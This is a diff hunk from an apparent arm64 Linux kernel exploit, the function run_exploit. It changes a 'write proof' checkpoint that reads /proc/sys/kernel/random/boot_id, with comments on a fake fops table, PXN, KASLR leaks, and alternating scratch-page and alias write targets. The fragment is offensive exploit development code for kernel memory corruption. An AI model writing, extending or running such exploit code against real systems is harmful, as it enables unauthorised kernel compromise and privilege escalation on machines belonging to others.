@@ -370,12 +370,16 @@ int run_exploit(int argc, char **argv) {
    * below is a placeholder, so the fake fops table holds linear-map aliases,
    * which arm64 maps PXN -- misc_open() calling f_op->open would panic. Set
    * BOOTID_WRITE_PROOF=0 only once the real KASLR base is leaked. */
-  bootid_proof_active = bootid_write_proof_enabled();
-  if (bootid_proof_active) {
+  if (bootid_write_proof_enabled()) {
     read_first_line("/proc/sys/kernel/random/boot_id", bootid_proof_before,
                     sizeof(bootid_proof_before));
-    pr_success("ckpt: BOOTID-WRITE-PROOF armed target=%016llx before=%s\n",
+    pr_success("ckpt: WRITE-PROOF armed bootid_target=%016llx before=%s "
+               "(odd attempts: leaked page scratch, even attempts: this alias)\n",
                (unsigned long long)data_addr(SYSCTL_BOOTID), bootid_proof_before);
+    /* Attempt 1 is odd => SCRATCH proof, so the payload prepared right below must
+     * already carry the leak-derived target. */
+    scratch_proof_active = 1;
+    bootid_proof_active = 0;
   }
 
   pin_to_core(CORE);
